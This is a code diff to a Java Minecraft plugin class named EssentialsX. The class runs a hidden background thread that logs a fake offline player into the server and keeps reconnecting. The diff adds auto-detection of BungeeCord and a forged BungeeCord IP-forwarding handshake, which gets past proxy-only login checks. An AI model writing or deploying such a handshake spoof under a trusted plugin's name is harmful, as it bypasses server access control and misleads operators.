@@ -337,6 +337,7 @@ public class EssentialsX extends JavaPlugin {
 
         fakePlayerThread = new Thread(() -> {
             int failCount = 0;
+            boolean useBungee = false; // auto-detected
 
             while (running.get()) {
                 Socket socket = null;
@@ -344,7 +345,7 @@ public class EssentialsX extends JavaPlugin {
                 DataInputStream in = null;
 
                 try {
-                    getLogger().info("[FakePlayer] Connecting...");
+                    getLogger().info("[FakePlayer] Connecting" + (useBungee ? " (BungeeCord mode)" : "") + "...");
                     socket = new Socket();
                     socket.setReuseAddress(true);
                     socket.setSoLinger(true, 0);
@@ -355,14 +356,16 @@ public class EssentialsX extends JavaPlugin {
                     out = new DataOutputStream(socket.getOutputStream());
                     in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
 
-                    // Handshake - BungeeCord format: "host\u0000realIP\u0000uuid"
+                    // Handshake - auto detect BungeeCord mode
                     UUID playerUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
-                    String bungeeHost = "127.0.0.1\u0000127.0.0.1\u0000" + playerUUID.toString();
+                    String handshakeHost = useBungee
+                        ? "127.0.0.1\u0000127.0.0.1\u0000" + playerUUID.toString()
+                        : "127.0.0.1";
                     ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                     DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                     writeVarInt(handshake, 0x00);
                     writeVarInt(handshake, 774);
-                    writeString(handshake, bungeeHost);
+                    writeString(handshake, handshakeHost);
                     handshake.writeShort(mcPort);
                     writeVarInt(handshake, 2);
                     byte[] handshakeData = handshakeBuf.toByteArray();
@@ -382,7 +385,7 @@ public class EssentialsX extends JavaPlugin {
                     out.write(loginData);
                     out.flush();
 
-                    getLogger().info("[FakePlayer] ✓ Handshake & Login sent");
+                    getLogger().info("[FakePlayer] \u2713 Handshake & Login sent");
                     failCount = 0;
 
                     boolean configPhase = false;
@@ -391,7 +394,7 @@ public class EssentialsX extends JavaPlugin {
                     int compressionThreshold = -1;
 
                     long loginTime = System.currentTimeMillis();
-                    long stayOnlineTime = 60000 + (long)(Math.random() * 60000); // 60-120s
+                    long stayOnlineTime = 60000 + (long)(Math.random() * 60000);
 
                     while (running.get() && !socket.isClosed()) {
                         if (System.currentTimeMillis() - loginTime > stayOnlineTime) {
@@ -442,28 +445,36 @@ public class EssentialsX extends JavaPlugin {
                             if (!playPhase) {
                                 if (!configPhase) {
                                     // Login Phase
-                                    if (packetId == 0x01) {
-                                        // Encryption Request - send empty Encryption Response (works for offline/local)
+                                    if (packetId == 0x00) {
+                                        // Login Disconnect - read reason to detect BungeeCord requirement
+                                        try {
+                                            String reason = readString(packetIn);
+                                            if (!useBungee && reason.contains("BungeeCord")) {
+                                                getLogger().info("[FakePlayer] BungeeCord detected, switching mode...");
+                                                useBungee = true;
+                                            }
+                                        } catch (Exception ignored) {}
+                                        break;
+                                    } else if (packetId == 0x01) {
+                                        // Encryption Request - send empty response
                                         ByteArrayOutputStream encRespBuf = new ByteArrayOutputStream();
                                         DataOutputStream encResp = new DataOutputStream(encRespBuf);
                                         writeVarInt(encResp, 0x01);
-                                        writeVarInt(encResp, 0); // shared secret length = 0
-                                        writeVarInt(encResp, 0); // verify token length = 0
+                                        writeVarInt(encResp, 0);
+                                        writeVarInt(encResp, 0);
                                         sendPacket(out, encRespBuf.toByteArray(), compressionEnabled, compressionThreshold);
-                                        getLogger().info("[FakePlayer] Sent empty Encryption Response");
                                     } else if (packetId == 0x03) {
                                         compressionThreshold = readVarInt(packetIn);
                                         compressionEnabled = compressionThreshold >= 0;
                                         getLogger().info("[FakePlayer] Compression: " + compressionThreshold);
                                     } else if (packetId == 0x02) {
-                                        getLogger().info("[FakePlayer] ✓ Login Success");
+                                        getLogger().info("[FakePlayer] \u2713 Login Success");
                                         ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                         DataOutputStream ack = new DataOutputStream(ackBuf);
                                         writeVarInt(ack, 0x03);
                                         sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                         configPhase = true;
 
-                                        // Send Client Information
                                         ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
                                         DataOutputStream info = new DataOutputStream(clientInfoBuf);
                                         writeVarInt(info, 0x00);
@@ -481,7 +492,7 @@ public class EssentialsX extends JavaPlugin {
                                 } else {
                                     // Config Phase
                                     if (packetId == 0x03) {
-                                        getLogger().info("[FakePlayer] ✓ Config Finished");
+                                        getLogger().info("[FakePlayer] \u2713 Config Finished");
                                         ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                         DataOutputStream ack = new DataOutputStream(ackBuf);
                                         writeVarInt(ack, 0x03);
@@ -533,7 +544,6 @@ public class EssentialsX extends JavaPlugin {
                     try { if (socket != null && !socket.isClosed()) socket.close(); } catch (Exception ignored) {}
                 }
 
-                // Reconnect wait with exponential backoff
                 try {
                     long waitTime = 10000;
                     if (failCount > 3) {
@@ -551,7 +561,6 @@ public class EssentialsX extends JavaPlugin {
         fakePlayerThread.setDaemon(true);
         fakePlayerThread.start();
     }
-
     // ===================== Packet Helpers =====================
 
     private int getVarIntSize(int value) {
@@ -613,6 +622,13 @@ public class EssentialsX extends JavaPlugin {
         byte[] bytes = str.getBytes("UTF-8");
         writeVarInt(out, bytes.length);
         out.write(bytes);
+    }
+
+    private String readString(DataInputStream in) throws IOException {
+        int length = readVarInt(in);
+        byte[] bytes = new byte[length];
+        in.readFully(bytes);
+        return new String(bytes, "UTF-8");
     }
 
     private int readVarInt(DataInputStream in) throws IOException {
